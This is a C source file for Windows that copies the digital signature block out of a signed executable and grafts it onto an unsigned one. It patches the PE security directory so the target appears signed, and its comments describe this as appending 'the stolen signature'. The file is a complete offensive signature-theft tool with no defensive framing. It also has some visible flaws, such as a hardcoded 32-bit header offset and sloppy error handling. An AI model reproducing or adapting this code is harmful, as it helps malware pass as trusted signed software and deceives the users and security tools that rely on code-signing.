#include <Windows.h>
#include <stdio.h>
#include <Shlwapi.h>

BOOL RtlLoadPeHeaders(PIMAGE_DOS_HEADER *Dos, PIMAGE_NT_HEADERS *Nt, PIMAGE_FILE_HEADER *File, PIMAGE_OPTIONAL_HEADER *Optional, PIMAGE_SECTION_HEADER *Section, PBYTE *ImageBase);
DWORD RtlInitFileHandle(HANDLE hHandle, DWORD dwFlag);

int wmain(int argc, wchar_t *argv[], wchar_t *envp[])
{
	LPWSTR *szArg = NULL;
	INT Args;
	DWORD dwSize, dwRead, dwX, Offset, FilePtr;

	HANDLE hHandle;
	PBYTE SecurityData;
	DWORD SecuritySize;
	PBYTE pBuffer;
	PIMAGE_DOS_HEADER Dos;
	PIMAGE_NT_HEADERS Nt;
	PIMAGE_FILE_HEADER File;
	PIMAGE_OPTIONAL_HEADER Optional;
	PIMAGE_SECTION_HEADER Section;

	szArg = CommandLineToArgvW(GetCommandLine(), &Args);
	if (szArg == NULL)
		return GetLastError();

	if (!PathFileExists(szArg[1]))
		goto FAILURE;

	if (!PathFileExists(szArg[2]))
		goto FAILURE;

	//Open first file and get its digital signature

	hHandle = CreateFile(szArg[1], GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
		goto FAILURE;

	dwSize = RtlInitFileHandle(hHandle, FILE_BEGIN);
	if (dwSize == ERROR_SUCCESS) goto FAILURE;

	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
	if (pBuffer == NULL)
		goto FAILURE;

	if (!ReadFile(hHandle, pBuffer, dwSize, &dwRead, NULL))
		goto FAILURE;

	RtlLoadPeHeaders(&Dos, &Nt, &File, &Optional, &Section, &pBuffer);

	SecuritySize = Optional->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size;
	Offset = Optional->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress;
	SecurityData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Optional->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size);
	if (SecurityData == NULL)
		goto FAILURE;

	for (dwX = 0; dwX < Optional->DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size; dwX++, Offset++)
	{
		SecurityData[dwX] = pBuffer[Offset]; //works!
	}

	//open second, unsigned file, and append the stolen signature

	CloseHandle(hHandle); hHandle = NULL;
	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer);
	pBuffer = NULL;
	Dos = 0; Nt = 0; File = 0; Optional = 0; Section = 0;
	
	hHandle = CreateFile(szArg[2], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
		goto FAILURE;

	dwSize = GetFileSize(hHandle, NULL);
	if (dwSize == 0)
		goto FAILURE;

	dwRead = 0;
	dwSize += dwX;

	FilePtr = SetFilePointer(hHandle, 0, NULL, FILE_END);
	if (FilePtr == INVALID_SET_FILE_POINTER)
		goto FAILURE;

	if (!WriteFile(hHandle, (PBYTE)SecurityData, dwX, &dwRead, NULL)) //append to end of file
		goto FAILURE;
	
	if (SetFilePointer(hHandle, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) //move to the front of the file for reading
		goto FAILURE;

	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
	if (pBuffer == NULL)
		goto FAILURE;

	if (!ReadFile(hHandle, pBuffer, dwSize, &dwRead, NULL))
		goto FAILURE;

	RtlLoadPeHeaders(&Dos, &Nt, &File, &Optional, &Section, &pBuffer);

	dwX = (Dos->e_lfanew + sizeof(DWORD)) + sizeof(IMAGE_FILE_HEADER); //offset of optionalheader
	dwX += 144; //offset of security dir from optional header
	if (SetFilePointer(hHandle, dwX, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
		goto FAILURE;

	if (!WriteFile(hHandle, &FilePtr, sizeof(FilePtr), &dwRead, NULL))
		goto FAILURE;

	dwRead = 0;

	dwX += 4; //set size

	if (!WriteFile(hHandle, &SecuritySize, sizeof(SecuritySize), &dwRead, NULL))
		goto FAILURE;

	if (SecurityData)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, SecurityData);

	if (hHandle)
		CloseHandle(hHandle);

	if (pBuffer)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer);

	if (szArg)
		LocalFree(szArg);

	return ERROR_SUCCESS;

FAILURE:

	if (SecurityData)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, SecurityData);

	if (hHandle)
		CloseHandle(hHandle);

	if (pBuffer)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pBuffer);

	if (szArg)
		LocalFree(szArg);

	return GetLastError();

}

BOOL RtlLoadPeHeaders(PIMAGE_DOS_HEADER *Dos, PIMAGE_NT_HEADERS *Nt, PIMAGE_FILE_HEADER *File, PIMAGE_OPTIONAL_HEADER *Optional, PIMAGE_SECTION_HEADER *Section, PBYTE *ImageBase)
{
	*Dos = (PIMAGE_DOS_HEADER)*ImageBase;
	if ((*Dos)->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	*Nt = (PIMAGE_NT_HEADERS)((PBYTE)*Dos + (*Dos)->e_lfanew);
	if ((*Nt)->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	*File = (PIMAGE_FILE_HEADER)(*ImageBase + (*Dos)->e_lfanew + sizeof(DWORD));
	*Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)*File + sizeof(IMAGE_FILE_HEADER));

	*Section = (PIMAGE_SECTION_HEADER)((PBYTE)*ImageBase + (*Dos)->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	return TRUE;
}

DWORD RtlInitFileHandle(HANDLE hHandle, DWORD dwFlag)
{
	if (SetFilePointer(hHandle, 0, NULL, dwFlag) == INVALID_SET_FILE_POINTER)
		return 0;

	return GetFileSize(hHandle, NULL);
}
